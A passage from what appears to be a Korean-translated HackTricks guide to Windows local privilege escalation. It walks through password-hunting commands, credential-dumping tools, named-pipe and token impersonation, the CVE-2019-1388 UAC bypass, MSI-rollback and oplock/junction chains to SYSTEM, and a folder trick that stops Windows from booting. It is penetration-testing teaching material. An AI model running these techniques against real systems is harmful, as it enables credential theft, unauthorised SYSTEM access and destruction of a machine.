비밀번호가 **Chrome or Firefox**에 저장된 db를 확인해야 합니다.\
또한 브라우저의 기록, 북마크 및 즐겨찾기를 확인하세요. 일부 비밀번호가 그곳에 저장되어 있을 수 있습니다.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows 운영체제에 포함된 기술로, 서로 다른 언어로 작성된 소프트웨어 구성 요소 간의 **상호 통신**을 가능하게 합니다. 각 COM 구성 요소는 **identified via a class ID (CLSID)**로 식별되며 각 구성 요소는 하나 이상의 인터페이스를 통해 기능을 노출하고, 해당 인터페이스는 **identified via interface IDs (IIDs)**로 식별됩니다.

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서의 일반적인 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름을 가진 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호를 검색하세요**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf 플러그인**으로, 제가 만든 이 플러그인은 피해자 시스템 내부에서 credentials를 검색하는 모든 metasploit POST 모듈을 **자동으로 실행**하도록 설계되었습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)은 이 페이지에 언급된 비밀번호를 포함한 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)은 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)는 이 데이터를 평문으로 저장하는 여러 툴(PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP)의 **sessions**, **usernames** 및 **passwords**를 검색합니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

상상해보자: **SYSTEM으로 실행되는 프로세스가 `OpenProcess()`로 새 프로세스를 연다** (권한: **full access**). 같은 프로세스는 또한 `CreateProcess()`로 **low privileges**를 가진 새 프로세스를 생성하는데, 이 프로세스는 메인 프로세스의 모든 열린 handles를 상속받는다.\
그렇다면, 만약 당신이 **low privileged process에 대해 full access를 가지고 있다면**, `OpenProcess()`로 생성된 권한 있는 프로세스에 대한 열린 핸들을 획득하고 **shellcode를 주입**할 수 있다.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

공유 메모리 세그먼트, 일반적으로 **pipes**라 불리는 것들은 프로세스 간 통신과 데이터 전송을 가능하게 한다.

Windows는 **Named Pipes**라는 기능을 제공하며, 관련 없는 프로세스들조차 서로 데이터를 공유할 수 있고 심지어 다른 네트워크 상에서도 동작한다. 이는 클라이언트/서버 아키텍처와 유사하며 역할은 **named pipe server**와 **named pipe client**로 정의된다.

클라이언트가 파이프를 통해 데이터를 전송하면, 파이프를 설정한 **server**는 필요한 **SeImpersonate** 권한이 있다면 **client의 identity를 takeover(가져올)** 수 있다. 당신이 흉내낼 수 있는 파이프를 통해 통신하는 **privileged process**를 식별하면, 당신이 만든 파이프와 상호작용할 때 그 프로세스의 identity를 채택하여 **더 높은 권한을 얻을** 기회를 제공한다. 이러한 공격을 실행하는 방법에 대한 지침은 [**here**](named-pipe-client-impersonation.md)와 [**here**](#from-high-integrity-to-system)에서 확인할 수 있다.

또한 다음 도구는 **burp와 같은 툴로 named pipe 통신을 가로챌 수 있게 해준다:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 privescs를 찾기 위해 모든 파이프를 나열하고 볼 수 있게 해준다:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony 서비스(`TapiSrv`)의 server 모드는 `\\pipe\\tapsrv` (MS-TRP)를 노출한다. 원격 인증된 클라이언트는 mailslot 기반 비동기 이벤트 경로를 악용하여 `ClientAttach`를 NETWORK SERVICE가 쓰기 가능한 기존 파일에 대한 임의의 4바이트 쓰기로 바꾸고, 이후 Telephony admin 권한을 얻어 서비스로서 임의의 DLL을 로드할 수 있다. 전체 흐름:

- `ClientAttach`에서 `pszDomainUser`를 쓰기 가능한 기존 경로로 설정 → 서비스는 `CreateFileW(..., OPEN_EXISTING)`로 이를 열고 비동기 이벤트 쓰기에 사용한다.
- 각 이벤트는 `Initialize`에서 공격자가 제어하는 `InitContext`를 해당 핸들에 쓴다. `LRegisterRequestRecipient`(`Req_Func 61`)로 라인 앱을 등록하고, `TRequestMakeCall`(`Req_Func 121`)을 트리거한 뒤 `GetAsyncEvents`(`Req_Func 0`)로 가져오고, 그 다음 unregister/shutdown 하여 결정론적 쓰기를 반복한다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가하고 재연결한 다음 임의의 DLL 경로로 `GetUIDllName`을 호출하여 `TSPI_providerUIIdentify`를 `NETWORK SERVICE`로 실행한다.

더 자세한 내용:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

페이지를 확인해보세요: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

사용자 권한으로 shell을 얻었을 때, scheduled tasks나 다른 프로세스들이 실행되며 **pass credentials on the command line** 하는 경우가 있을 수 있다. 아래 스크립트는 프로세스의 command lines를 2초마다 캡처하고 현재 상태를 이전 상태와 비교하여 변경분만 출력한다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스에 접근할 수 있고 (via console or RDP) UAC가 활성화되어 있는 경우, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로부터 터미널이나 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행할 수 있습니다.

이로 인해 동일한 취약점으로 권한 상승과 UAC 우회가 동시에 가능해집니다. 또한 추가로 아무것도 설치할 필요가 없으며, 프로세스 중 사용되는 바이너리는 Microsoft에서 서명하고 발행한 것입니다.

영향을 받는 시스템 중 일부는 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## 관리자 Medium에서 High 무결성 수준으로 / UAC Bypass

이걸 읽어 **Integrity Levels**에 대해 배우세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그다음 **UAC와 UAC bypasses에 대해 배우려면 이것을 읽으세요:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename에서 SYSTEM EoP로 가기

이 기술은 [**이 블로그 포스트**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)에 설명되어 있으며 익스플로잇 코드는 [**여기**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)에서 확인할 수 있습니다.

공격은 기본적으로 Windows Installer의 rollback 기능을 남용해 정상 파일을 제거/교체하고 언인스톨 과정 중에 악성 파일로 바꾸는 방식입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 하이재크하기 위한 **악성 MSI installer**를 만들어야 하고, 이후 다른 MSI 패키지의 언인스톨 시 Windows Installer가 rollback 파일을 저장할 때 그 파일들이 악성 페이로드를 포함하도록 조작됩니다.

요약된 기법은 다음과 같습니다:

1. Stage 1 – Hijack 준비 (`C:\Config.Msi`를 비워둠)

- Step 1: MSI 설치
- `TARGETDIR` 같은 쓰기 가능한 폴더에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
- 인스톨러를 **"UAC Compliant"**로 표시하여 **비관리자 사용자**도 실행할 수 있게 합니다.
- 설치 후 파일에 대한 **handle**을 열어 둡니다.

- Step 2: 언인스톨 시작
- 동일한 `.msi`를 언인스톨합니다.
- 언인스톨 과정에서 파일들이 `C:\Config.Msi`로 이동되고 `.rbf` 파일로 이름이 바뀝니다(rollback 백업).
- 파일이 `C:\Config.Msi\<random>.rbf`가 되었는지 감지하기 위해 `GetFinalPathNameByHandle`로 **열려 있는 파일 핸들**을 폴링합니다.

- Step 3: 커스텀 동기화
- `.msi`에는 다음을 수행하는 **커스텀 언인스톨 액션(`SyncOnRbfWritten`)**이 포함되어 있습니다:
- `.rbf`가 작성되면 신호를 보냅니다.
- 언인스톨을 계속하기 전에 다른 이벤트를 **대기**합니다.

- Step 4: `.rbf` 삭제 차단
- 신호를 받으면 `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 **오픈**하여 **삭제가 되지 않게** 합니다.
- 그런 다음 언인스톨이 완료될 수 있도록 **신호를 되돌려 줍니다**.
- Windows Installer는 `.rbf`를 삭제하지 못하고, 모든 내용을 삭제할 수 없기 때문에 **`C:\Config.Msi`가 제거되지 않습니다**.

- Step 5: `.rbf`를 수동으로 삭제
- 공격자는 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`는 비어있어** 하이재크할 준비가 됩니다.

> 이 시점에서, **SYSTEM 레벨의 arbitrary folder delete 취약점**을 트리거하여 `C:\Config.Msi`를 삭제하세요.

2. Stage 2 – Rollback 스크립트를 악성으로 교체

- Step 6: 약한 ACL로 `C:\Config.Msi` 재생성
- 직접 `C:\Config.Msi` 폴더를 다시 만듭니다.
- **약한 DACL**(예: Everyone:F)을 설정하고 `WRITE_DAC`로 **핸들을 열어 둡니다**.

- Step 7: 다른 설치 실행
- 다시 `.msi`를 설치하되:
- `TARGETDIR`: 쓰기 가능한 위치.
- `ERROROUT`: 강제 실패를 유발하는 변수.
- 이 설치는 다시 **rollback**을 트리거하는 데 사용됩니다(이때 `.rbs`와 `.rbf`를 읽음).

- Step 8: `.rbs` 감시
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하여 새 `.rbs`가 나타날 때까지 기다립니다.
- 그 파일명을 캡처합니다.

- Step 9: Rollback 전에 동기화
- `.msi`에는 다음을 수행하는 **커스텀 인스톨 액션(`SyncBeforeRollback`)**이 포함되어 있습니다:
- `.rbs`가 생성되면 이벤트를 신호합니다.
- 그런 다음 계속하기 전에 **대기**합니다.

- Step 10: 약한 ACL 다시 적용
- `.rbs 생성됨` 이벤트를 받은 후:
- Windows Installer는 `C:\Config.Msi`에 **강한 ACL을 다시 적용**합니다.
- 하지만 당신은 여전히 `WRITE_DAC` 핸들을 가지고 있으므로 **약한 ACL을 다시 적용**할 수 있습니다.

> ACL은 **핸들 오픈 시에만 적용되므로**, 여전히 폴더에 쓸 수 있습니다.

- Step 11: 가짜 `.rbs`와 `.rbf` 배치
- `.rbs` 파일을 덮어써서 Windows에 다음을 지시하는 **가짜 rollback 스크립트**를 넣습니다:
- 당신의 `.rbf` 파일(악성 DLL)을 **특권 있는 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)으로 복원하도록.
- SYSTEM 레벨 페이로드 DLL을 포함한 가짜 `.rbf`를 배치합니다.

- Step 12: Rollback 트리거
- 동기화 이벤트를 신호하여 인스톨러가 재개되도록 합니다.
- `ErrorOut`라는 **type 19 custom action**이 설치를 의도적으로 알려진 시점에서 실패하게 설정되어 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM이 DLL을 설치
- Windows Installer는:
- 당신의 악성 `.rbs`를 읽고,
- 타깃 위치에 당신의 `.rbf` DLL을 복사합니다.
- 이제 **SYSTEM이 로드하는 경로에 악성 DLL이 존재**하게 됩니다.

- 마지막 단계: SYSTEM 코드 실행
- `osk.exe`와 같은 신뢰된 **auto-elevated binary**를 실행하여 하이재크한 DLL을 로드하게 합니다.
- **끝**: 당신의 코드는 **SYSTEM 권한으로 실행**됩니다.


### Arbitrary File Delete/Move/Rename에서 SYSTEM EoP로 가기

주된 MSI rollback 기법(위의 방법)은 전체 폴더(`C:\Config.Msi` 등)를 삭제할 수 있다고 가정합니다. 하지만 취약점이 **임의의 파일 삭제만 허용**한다면 어떻게 할까요?

NTFS 내부 구조를 악용할 수 있습니다: 모든 폴더는 다음과 같은 숨겨진 대체 데이터 스트림을 가지고 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **인덱스 메타데이터**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면**, NTFS는 파일시스템에서 **해당 폴더 전체를 제거합니다**.

이 작업은 다음과 같은 표준 파일 삭제 API를 사용하여 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *파일* 삭제 API를 호출하고 있음에도 불구하고, 그것은 **폴더 자체를 삭제합니다**.

### 폴더 내용 삭제에서 SYSTEM EoP로
만약 여러분의 프리미티브가 임의의 파일/폴더를 삭제할 수 없지만, **공격자가 제어하는 폴더의 *내용* 삭제를 허용한다면**?

1. Step 1: 미끼 폴더와 파일 설정
- 생성: `C:\temp\folder1`
- 그 안에: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock** 설정
- 권한 있는 프로세스가 `file1.txt`를 삭제하려고 시도할 때, oplock은 **실행을 일시 중단합니다**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 스캔하고 그 내용물을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면 **oplock triggers** 하고 제어가 당신의 콜백으로 넘어갑니다.

4. Step 4: oplock callback 내부 – 삭제를 리다이렉트

- 옵션 A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 oplock을 깨지 않고 `folder1`을 비웁니다.
- `file1.txt`를 직접 삭제하지 마세요 — 그러면 oplock이 조기에 해제됩니다.

- 옵션 B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 옵션 C: `\RPC Control`에 **symlink**를 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이것은 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 겨냥합니다 — 이를 삭제하면 폴더 자체가 삭제됩니다.

5. 5단계: oplock 해제
- SYSTEM 프로세스는 계속 진행되어 `file1.txt`를 삭제하려고 시도합니다.
- 하지만 이제 junction + symlink 때문에 실제로 삭제하는 대상은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`는 SYSTEM에 의해 삭제됩니다.

### Arbitrary Folder Create에서 Permanent DoS로

primitive를 악용하여 **SYSTEM/admin로 임의 폴더를 생성하는 기능**을 이용하세요 — **파일을 쓸 수 없더라도** 또는 **약한 권한을 설정할 수 없더라도**.

예를 들어 **critical Windows driver**의 이름을 가진 **folder**(파일이 아님)를 생성하세요:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 일반적으로 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 만약 해당 경로를 **폴더로 미리 생성(pre-create)** 해두면, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면, Windows는 부팅 중에 `cng.sys`를 로드하려 합니다.
- 폴더를 발견하면, **실제 드라이버를 찾지 못하고**, **크래시하거나 부팅이 중단**됩니다.
- 외부 개입(예: 부팅 수리나 디스크 접근) 없이는 **대체 경로(fallback)가 없고**, **복구(recovery)가 불가능**합니다.


## **High Integrity에서 SYSTEM으로**

### **새 서비스**

이미 High Integrity 프로세스에서 실행 중이라면, **SYSTEM으로 가는 경로**는 단순히 **새 서비스를 생성하고 실행하는 것**만으로 쉽게 확보할 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 서비스 바이너리를 만들 때 유효한 서비스인지, 또는 바이너리가 필요한 동작을 빠르게 수행하는지 확인하세요. 유효한 서비스가 아니면 20초 후에 종료됩니다.

### AlwaysInstallElevated

High Integrity 프로세스에서 **AlwaysInstallElevated 레지스트리 항목을 활성화**하고 _**.msi**_ 래퍼를 사용해 **reverse shell을 설치**해 볼 수 있습니다.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**코드는** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

해당 token 권한을 보유하고 있다면(대개 이미 High Integrity 프로세스에서 발견됨), SeDebug 권한으로 거의 모든 프로세스(보호된 프로세스 제외)를 열고, 프로세스의 token을 복사하여 해당 token으로 임의의 프로세스를 생성할 수 있습니다.\
이 기법은 일반적으로 모든 token 권한을 가진 SYSTEM으로 실행 중인 프로세스를 선택합니다(_예, 모든 token 권한이 없는 SYSTEM 프로세스도 찾을 수 있습니다_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기법은 meterpreter가 `getsystem`으로 권한을 상승할 때 사용합니다. 기법은 **파이프를 생성한 뒤 그 파이프에 쓰도록 서비스를 생성/악용하는 것**으로 구성됩니다. 그런 다음 파이프를 생성한 **서버**는 **`SeImpersonate`** 권한을 사용해 파이프 클라이언트(서비스)의 **token을 가면화(impersonate)** 하여 SYSTEM 권한을 얻을 수 있습니다.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

SYSTEM으로 실행되는 **프로세스**가 로드하는 **dll**을 **hijack**하는 데 성공하면 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 권한 상승에 유용하며, 특히 high integrity 프로세스에서는 DLL을 로드하는 폴더에 대한 **write permissions**가 있기 때문에 훨씬 더 쉽게 달성할 수 있습니다.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**읽기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 추가 도움말

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 유용한 도구

**Windows 로컬 권한 상승 벡터를 찾기 위한 최고 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 구성 오류 및 민감한 파일을 검사합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 구성 오류를 확인하고 정보를 수집합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 구성 오류를 검사합니다**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP의 저장된 세션 정보를 추출합니다. 로컬에서 -Thorough 사용하세요.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 자격 증명을 추출합니다. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집된 비밀번호를 도메인 전반에 스프레이합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell 기반의 ADIDNS/LLMNR/mDNS/NBNS 스푸퍼 및 중간자 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 Windows 권한 상승 정보 열거**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 privesc 취약점을 검색합니다 (Watson으로 대체되어 사용 중단됨)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(Admin 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점을 검색합니다 (VisualStudio로 컴파일해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 호스트를 열거하여 구성 오류를 검색합니다 (privesc 보다는 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 여러 소프트웨어에서 자격 증명을 추출합니다 (GitHub에 사전 컴파일된 exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 구성 오류 검사 (GitHub에 사전 컴파일된 실행파일). 권장하지 않음. Win10에서 잘 동작하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 구성 오류를 검사합니다 (python으로 만든 exe). 권장하지 않음. Win10에서 잘 동작하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 만든 도구입니다 (정상 작동을 위해 accesschk가 필요하지 않지만 사용할 수 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력물을 읽어 작동 가능한 익스플로잇을 권장합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력물을 읽어 작동 가능한 익스플로잇을 권장합니다 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

프로젝트는 올바른 버전의 .NET으로 컴파일해야 합니다 ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 호스트에 설치된 .NET 버전을 확인하려면 다음을 실행하세요:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 참고자료

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) 및 커널 토큰 탈취](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Fox 추적: Kernel Shadows에서의 추적전](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
